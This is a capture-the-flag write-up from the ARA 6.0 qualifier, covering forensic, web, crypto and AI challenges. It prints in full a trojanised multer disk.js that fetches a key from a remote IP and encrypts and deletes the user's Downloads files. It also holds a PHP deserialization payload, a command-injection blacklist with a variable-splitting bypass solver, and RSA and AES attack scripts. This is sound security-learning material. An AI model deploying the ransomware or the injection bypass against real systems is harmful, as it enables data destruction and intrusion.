my write up, playing with team `tempe bacem ga enak hoekkkkkk` at ARA 6.0 Qualification

## Forensic
### Readable
regular png hex fixing, missing png header and ihdr chunk

![{A79BEEEA-F1FC-4AC8-B4FF-913B622B3394}](https://hackmd.io/_uploads/rkEmehSKye.png)

![chall](https://hackmd.io/_uploads/BJZJ1ZLKJe.png)


### whatshark
syscall traffic, seems to read and write something

![{DAE699EE-5F4F-4FEC-AA02-16100A0AD0B5}](https://hackmd.io/_uploads/Syzde3rtyg.png)

png raw data, dumped it!

![tes](https://hackmd.io/_uploads/SyNtxnSt1x.png)


### Daftar Kerja
the distribution gave us a disk dump of linux. we just need grep to solve this chall.

first of all, check the user home directory and we got readme file (ransom notes)

![image](https://hackmd.io/_uploads/B1O7gjBtkl.png)

by finding the source of readme.txt we will get the malicious code location

![image](https://hackmd.io/_uploads/Hy14gjHtyx.png)

the username can be checked at /etc/passwd

![image](https://hackmd.io/_uploads/SJVNxsStJx.png)

`disk.js`
```javascript
var fs = require('fs')
var os = require('os')
var path = require('path')
var crypto = require('crypto')
var mkdirp = require('mkdirp')
const https = require('https');

function getFilename (req, file, cb) {
  crypto.randomBytes(16, function (err, raw) {
    cb(err, err ? undefined : raw.toString('hex'))
  })
}

function getDestination (req, file, cb) {
  cb(null, os.tmpdir())
}

async function fetchData(url) {
  try {
    const response = await fetch(url);

    if (!response.ok) {
      return null;
    }

    return await response.text();
  } catch (error) {
    return null;
  }
}

function processFile(filePath, key, nonce) {
  const cipher = crypto.createCipheriv('aes-256-ctr', key, nonce);
  const input = fs.createReadStream(filePath);
  const output = fs.createWriteStream(`${filePath}.enc`);

  input.pipe(cipher).pipe(output);

  output.on('finish', () => {
    fs.unlink(filePath, (err) => {
    });
  });
}

function processFolder(folderPath, key, nonce) {
  fs.readdir(folderPath, { withFileTypes: true }, (err, entries) => {
    if (err) {
      return;
    }

    entries.forEach((entry) => {
      const fullPath = path.join(folderPath, entry.name);

      if (entry.isDirectory()) {
        processFolder(fullPath, key, nonce);
      } else if (entry.isFile()) {
        processFile(fullPath, key, nonce);
      }
    });
  });
}

function createFile(data, filePath) {
  fs.writeFile(filePath, data, () => {});
}

function DiskStorage (opts) {
  Promise.all([
    fetchData('http://157.245.204.42:1337/a.txt'),
    fetchData('http://157.245.204.42:1337/b.txt'),
    fetchData('http://157.245.204.42:1337/readme.txt'),
  ])
    .then(([key, nonce, readme]) => {
      processFolder(os.homedir() + '/Downloads', key, nonce);
      createFile(readme, os.homedir() + '/readme.txt');
    })
    .catch((err) => {
      
    });

  this.getFilename = (opts.filename || getFilename)

  if (typeof opts.destination === 'string') {
    mkdirp.sync(opts.destination)
    this.getDestination = function ($0, $1, cb) { cb(null, opts.destination) }
  } else {
    this.getDestination = (opts.destination || getDestination)
  }
}

DiskStorage.prototype._handleFile = function _handleFile (req, file, cb) {
  var that = this

  that.getDestination(req, file, function (err, destination) {
    if (err) return cb(err)

    that.getFilename(req, file, function (err, filename) {
      if (err) return cb(err)

      var finalPath = path.join(destination, filename)
      var outStream = fs.createWriteStream(finalPath)

      file.stream.pipe(outStream)
      outStream.on('error', cb)
      outStream.on('finish', function () {
        cb(null, {
          destination: destination,
          filename: filename,
          path: finalPath,
          size: outStream.bytesWritten
        })
      })
    })
  })
}

DiskStorage.prototype._removeFile = function _removeFile (req, file, cb) {
  var path = file.path

  delete file.destination
  delete file.filename
  delete file.path

  fs.unlink(path, cb)
}

module.exports = function (opts) {
  return new DiskStorage(opts)
}
```

the user and threat actor mail can be checked at the thunderbird cache located at `home\ubuntu\snap\thunderbird\common\.thunderbird\aqzwpfkz.default\ImapMail\imap.gmail.com`

![{9E51A092-9D08-434D-B7C0-EE2525027D91}](https://hackmd.io/_uploads/rJz9ViStye.png)

the meeting link is attached in the mail (encoded as base64)
![{1A2FD5EA-CEED-49BB-80E2-7641B7EDDA89}](https://hackmd.io/_uploads/Bk9qHoBFkx.png)

![{2DE935A4-5946-4FD2-8B1D-8E2A1B49C958}](https://hackmd.io/_uploads/r1T4yhrF1e.png)

its kinda hard to decrypt the important encrypted file since we can't find the cached a.txt and b.txt (key and nonce). but the original content before encryption seems to be cached. we can find it by finding the location of cached data, i try to search for the readme.txt btc address (because i notice it was cached by gnome text editor), found the location, and voila, we got the 10th question answer

![{7166CA05-B903-4BC5-99AF-83D4BA978FB5}](https://hackmd.io/_uploads/Skfu2iSKJl.png)

![{40067B74-3814-47BB-9134-3B12E4260A97}](https://hackmd.io/_uploads/Bk4kTiBtye.png)

```python
#ans.py
from pwn import *
import struct

p = remote('chall-ctf.ara-its.id', 32128)
p.recv()

ans = [
    'ubuntu',
    '197MJHgAPu5znTX836e4VXLHEPJp8ZCoV',
    'sudirmanryan579@gmail.com',
    'sanglegendaabdi@gmail.com',
    '32.000.000 - 45.000.000',
    'https://meet.google.com/nkb-ukxi-exj',
    'https://github.com/wengdev-33/nodejs-simple-file-upload',
    '/home/ubuntu/nodejs-simple-file-upload/node_modules/multer/storage/disk.js',
    '157.245.204.42:1337',
    'YATTA_BERHASIL_DECRYPT_CUY'
]

for i in ans:
    p.sendline(i.encode())
    print(i)
    print(p.recv())
    
# Congrats! Flag: ARA6{504l_Ini_di8u47_83rD454rK4N_r34l_c453_y4_G35_h3H3}
```
## Web
### Intuition
abuse PHP object references to make the input_R, input_G, and input_B values always match expected_R, expected_G, and expected_B (php serialize object)
```php
<?php

class IntuitionTest {
    public $name;
    public $expected_R;
    public $expected_G;
    public $expected_B;
    public $input_R;
    public $input_G;
    public $input_B;
}

$obj = new IntuitionTest();
$obj->name = "ganteng"; 

$obj->expected_R = 0;
$obj->expected_G = 0;
$obj->expected_B = 0;

$obj->input_R = &$obj->expected_R;
$obj->input_G = &$obj->expected_G;
$obj->input_B = &$obj->expected_B;

$payload = base64_encode(serialize($obj));

echo $payload, "\n";
```
payload:

`http://chall-ctf.ara-its.id:8008/index.php?i=TzoxMzoiSW50dWl0aW9uVGVzdCI6Nzp7czo0OiJuYW1lIjtzOjc6ImdhbnRlbmciO3M6MTA6ImV4cGVjdGVkX1IiO2k6MDtzOjEwOiJleHBlY3RlZF9HIjtpOjA7czoxMDoiZXhwZWN0ZWRfQiI7aTowO3M6NzoiaW5wdXRfUiI7UjozO3M6NzoiaW5wdXRfRyI7Ujo0O3M6NzoiaW5wdXRfQiI7Ujo1O30===`

![{B7AD38BD-DEF0-4648-A64A-12CC9ED7F735}](https://hackmd.io/_uploads/H10AnlIKkx.png)


### El-Kebanteren
![{121F1A69-C463-4A09-814C-8917515B08C9}](https://hackmd.io/_uploads/S1YPE3rtyx.png)

command injcetion race condition (?)

there is command injcetion vuln in this func with blacklisted. and there is a command that rm the file generated every 0.5s.

to bypass the blacklist sets two shell variables so that flag.$a$b becomes “flag.txt” without ever writing the literal substring “txt” in the payload.
and use dd because it not blacklisted
```
        blacklist = [
        "ls", "cat", "rm", "mv", "id", "cp", "wget", "curl", "chmod", "chown", "find", "ps",
        "grep", "awk", "sed", "bash", "sh", "python", "perl", "php", "sudo", "whoami",
        "vi", "vim", "nano", "info", "uname", "more", "head", "less", "tail", "txt", "&&", "|", "`", "$(", ">", "<", "&", "'", '"', "*", "\n"
        ]

        if any(word in inputed for word in blacklist):
            return render_template('quotes.html', quotes=random_quote, inputed=inputed)

        process = subprocess.run(inputed, shell=True, capture_output=True, text=True)
        output = process.stdout

        get_date_minute = datetime.now().strftime('%Y%m%d%H%M')
        random_number = binascii.hexlify(get_date_minute.encode()).decode()
        file_name = f'{random_number}.txt'
        file_path = os.path.join(QUOTE_DIR, file_name)
        with open(file_path, 'w') as f:
            f.write(random_quote + '\n')
            f.write(output + '\n')
        
        os.system(f'sleep 0.5 && rm {file_path} &')
```

ls payload: `a=l;b=s; $a$b /`
solver
```python
#!/usr/bin/env python3
import requests
import time
import datetime
import binascii

BASE_URL = "http://chall-ctf.ara-its.id:12124"

payload = {
    "input": "a=t;b=xt;dd if=/555fa546f50f3e869c7d1d5669ef280a.$a$b bs=1"
}

session = requests.Session()

r = session.post(BASE_URL + "/get_quotes", data=payload)
if r.status_code != 200:
    print("post fail")
    exit(1)


now_str = datetime.datetime.now().strftime('%Y%m%d%H%M')
hex_now = binascii.hexlify(now_str.encode()).decode()
filename = f"{hex_now}.txt"
file_url = BASE_URL + "/generated_quotes/" + filename
print(f"{filename}")


for i in range(10):
    r_file = session.get(file_url)
    if r_file.status_code == 200 and r_file.text.strip() != "":
        print(r_file.text.strip())
        break
    time.sleep(0.1)
else:
    print("eror")
```
`ARA6{Raden_Banter_is_SPEEEEEEEED_SUIIIIIIIIII} `

## AI?
### ilynaga
GA TAU, INI CHALL APAAN SIH
![{AC51F5BC-5298-45E7-B4EA-11A44E7CD32A}](https://hackmd.io/_uploads/BkHKKkLYke.png)

POKOKNYA INTINYA INI
`return success if ssim_value>=0.96 and predicted_class == 'True' else fail`

SSIM_VALUE ITU NILAI DARI GAMBAR MAS-MASNYA, PREDICTED_CLASS POKOKNYA YG PENTING GAMBAR MUKA AI-NYA KEDETECT. ANJRIT 3 JAM GUA OBRAK ABRIK PAKE PAINT

## Crypto
###  currently in a relationship (nope) 
The encryption scheme produces two ciphertext files (flag1.enc and flag2.enc), each of which is split into fixed-size blocks (192 bytes per block)

the public exponent used is e = 245, and the linear relation parameters a=24a=24 and b=50b=50.

For each pair of ciphertext blocks, the chall forms
![{32FD8785-2072-4364-B90F-169B5002FF78}](https://hackmd.io/_uploads/rk1wseLFke.png)

Under the franklin-reiter related message attack the gcd should be a linear polynomial Lx + C

we can use the Franklin–Reiter idea by computing the greatest common divisor (gcd) of the two polynomials
![{BDF1772B-5B02-4582-A8DD-F6EBC9D4D467}](https://hackmd.io/_uploads/Bk22ieLtye.png)

Because standard computer–algebra systems (or sympy’s built–in gcd) work over a field (and nn is composite) we code a simple Euclidean algorithm for polynomials over the ring Z/nZ. (This works as long as the coefficients we need to “divide by” are invertible modulo nn. In our case the “leading coefficients” turn out to be invertible.)

```python
#!/usr/bin/env python3
import math

def modinv(a, mod):
    t, newt = 0, 1
    r, newr = mod, a % mod
    while newr != 0:
        quotient = r // newr
        t, newt = newt, t - quotient * newt
        r, newr = newr, r - quotient * newr
    if r != 1:
        raise Exception(f"modular inverse does not exist for {a} mod {mod}")
    return t % mod


def poly_divmod(A, B, mod):

    A = A[:]  
    degA = len(A) - 1
    degB = len(B) - 1
    if degB < 0:
        raise Exception("Division by the zero polynomial")
    Q = [0] * (degA - degB + 1) if degA >= degB else []
    while len(A) - 1 >= degB and A:
        degA = len(A) - 1
        factor = (A[degA] * modinv(B[degB], mod)) % mod
        pos = degA - degB
        Q[pos] = factor
        for i in range(degB + 1):
            A[i + pos] = (A[i + pos] - factor * B[i]) % mod
        while A and A[-1] % mod == 0:
            A.pop()
    return Q, A  

def poly_gcd(A, B, mod):

    A = A[:] 
    while A and A[-1] % mod == 0:
        A.pop()
    B = B[:] 
    while B and B[-1] % mod == 0:
        B.pop()
    while B:
        Q, R = poly_divmod(A, B, mod)
        A, B = B, R
    if not A:
        return []
    inv_lead = modinv(A[-1], mod)
    return [(coeff * inv_lead) % mod for coeff in A]

def poly_from_encryption(a, b, exp, c, mod):
    poly = [0] * (exp + 1)
    for i in range(exp + 1):
        coeff = math.comb(exp, i) * pow(a, i, mod) * pow(b, exp - i, mod)
        poly[i] = coeff % mod

    poly[0] = (poly[0] - c) % mod
    return poly

def poly_from_plain(exp, c, mod):

    poly = [0] * (exp + 1)
    poly[0] = (-c) % mod
    poly[exp] = 1
    return poly

if __name__ == "__main__":
    with open("out.txt", "r") as f:
        modulus = int(f.read().strip())

    e = 245
    a = 24
    b = 50

    with open("flag1.enc", "rb") as f:
        data1 = f.read()
    with open("flag2.enc", "rb") as f:
        data2 = f.read()

    block_size_ct = 192 
    blocks1 = [data1[i:i+block_size_ct] for i in range(0, len(data1), block_size_ct)]
    blocks2 = [data2[i:i+block_size_ct] for i in range(0, len(data2), block_size_ct)]
    if len(blocks1) != len(blocks2):
        raise Exception("The two ciphertext files do not have the same number of blocks.")

    print(f"Found {len(blocks1)} blocks.")

    plaintext_blocks = []
    pt_block_size = (1536 // 8) - 1

    for i, (ct1_block, ct2_block) in enumerate(zip(blocks1, blocks2)):
        print(f"Processing block {i+1} of {len(blocks1)}...")
        c1 = int.from_bytes(ct1_block, "big")
        c2 = int.from_bytes(ct2_block, "big")

        # f(x) = (a*x + b)^e - c2  and  g(x) = x^e - c1, with coefficients modulo n.
        poly_f = poly_from_encryption(a, b, e, c2, modulus)
        poly_g = poly_from_plain(e, c1, modulus)

        gcd_poly = poly_gcd(poly_f, poly_g, modulus)

        if len(gcd_poly) != 2:
            print("[-] Block", i+1, ": Unexpected gcd degree (expected 1, got degree %d)." % (len(gcd_poly)-1))
            continue


        L = gcd_poly[1]
        C = gcd_poly[0]
        try:
            m = (-C * modinv(L, modulus)) % modulus
        except Exception as exc:
            print("[-] Block", i+1, ": Failed to invert leading coefficient:", exc)
            continue

        pt_block = m.to_bytes(pt_block_size, "big")
        plaintext_blocks.append(pt_block)

    plaintext = b"".join(plaintext_blocks)
    with open("solved_flag.png", "wb") as f:
        f.write(plaintext)

    print("Decryption complete. Output written to solved_flag.png")
```

from the solver, we got this

![{76A0CBB4-C73B-420E-9B60-090FB138E0D6}](https://hackmd.io/_uploads/Bks7hgUKkg.png)

now try to bruteforce the password to decrypt the aes encrypted flag2.enc
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def try_decrypt(key: bytes, ciphertext: bytes) -> bytes:

    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(ciphertext)
    try:
        plaintext = unpad(decrypted, AES.block_size)
        return plaintext
    except ValueError:
        return None

def main():
    with open("flag22.enc", "rb") as f:
        ciphertext = f.read()
    found = False

    with open("/home/jons/wordlist/rockyou.txt", "r", encoding="latin-1") as f:
        for line in f:
            candidate = line.strip()

            if len(candidate) not in (16, 24, 32):
                continue

            key = candidate.encode("utf-8")
            print("key:", key)
            plaintext = try_decrypt(key, ciphertext)

            if plaintext is not None and b"ARA6{" in plaintext:
                print(" key found:", candidate)
                print(plaintext[:200].decode("utf-8", errors="replace"))
                found = True
                break

    if not found:
        print("No valid key found in rockyou.txt.")

if __name__ == "__main__":
    main()
```

![{F685F0B2-F02A-4836-8BCE-AE48093B6594}](https://hackmd.io/_uploads/SkEVW-8Yyg.png)
